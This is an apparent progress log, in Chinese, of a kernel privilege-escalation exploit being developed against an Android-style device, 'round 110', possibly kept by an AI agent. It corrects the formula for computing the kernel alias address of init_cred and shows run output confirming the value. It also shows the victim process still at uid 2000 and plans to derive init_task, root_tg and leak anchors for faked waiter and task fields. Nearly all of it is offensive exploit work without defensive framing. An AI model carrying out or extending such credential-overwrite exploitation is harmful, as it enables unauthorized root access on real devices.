# 43499 · 凭据别名与归档**逐字相等**（round 110）

## 我犯的常量错（归档当场指出 ✗）

```
归档（退役真机 ✓）：
  init_cred image=ffffffc082bfd588   alias=ffffff802abfd588
  p0 profile … phys_offset=0000000080000000 delta=0000000028000000
                init_task=ffffff802ac43400  root_tg=ffffff802ad58ac0
  cpu pair: main=0 consumer=1 ✓（与我 pin 的一致 ✓）

我此前：credential_value = init_cred | 0xffffffc000000000      ✗ 基址与增量都不对
正确式：alias = 0xffffff8000000000 + offset + delta,  delta = phys_load − phys_offset
验算：0xffffff8000000000 + 0x2bfd588 + 0x28000000 = 0xffffff802abfd588 ✓ = 归档 ✓
```

## 真机（本轮）

```
main: layout matches=1 accepts=1 value=0xffffff802abfd588    ← 与归档 alias **逐字符相等** ✓
main: route status=0/0 attempts=15/17 calls=1 successes=1
main: victim comm after len=15   ✗      main: victim uid=2000   ✗
```

## 归档里**还没对照过**的值（下一步，全都现成 ✓）

| 归档值 | 用途 | 我这边 |
| --- | --- | --- |
| `init_task=ffffff802ac43400` | 页内 waiter.task / pi_top_task（三个锚 ✓） | 待对照 ✗ |
| `root_tg=ffffff802ad58ac0` | 页内 task.group | 待对照 ✗ |
| `slide_logger=ffffff802ab01e28` / `bootid_data=ffffff802adc6819` | 泄漏侧锚点 | 待对照 ✗ |

⇒ 公式同一个（base + offset + delta ✓）⇒ 三个锚都能算出来并与归档**逐字比对** ✓。
